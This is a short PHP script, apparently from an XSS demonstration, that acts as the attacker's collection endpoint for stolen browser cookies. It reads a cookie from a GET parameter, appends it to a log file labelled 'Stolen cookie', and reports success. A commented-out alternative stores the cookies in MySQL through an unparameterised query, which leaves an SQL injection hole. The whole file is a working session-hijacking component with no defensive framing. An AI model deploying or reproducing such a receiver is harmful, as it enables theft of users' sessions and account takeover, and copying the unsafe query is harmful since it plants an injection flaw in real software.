<?php
// Log the stolen cookie to a file or database
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];  // Capture the stolen cookie
    // Optionally, you can log it to a file
    $file = 'cookies.log';
    $log = fopen($file, 'a');
    fwrite($log, "Stolen cookie: " . $cookie . "\n");
    fclose($log);

    // Alternatively, you could store it in a database (MySQL, etc.)
    // Example:
    // $conn = new mysqli('localhost', 'root', '', 'xss_demo');
    // $conn->query("INSERT INTO stolen_cookies (cookie_data) VALUES ('$cookie')");
    
    echo "Cookie stolen successfully!";
} else {
    echo "No cookie data received!";
}
?>
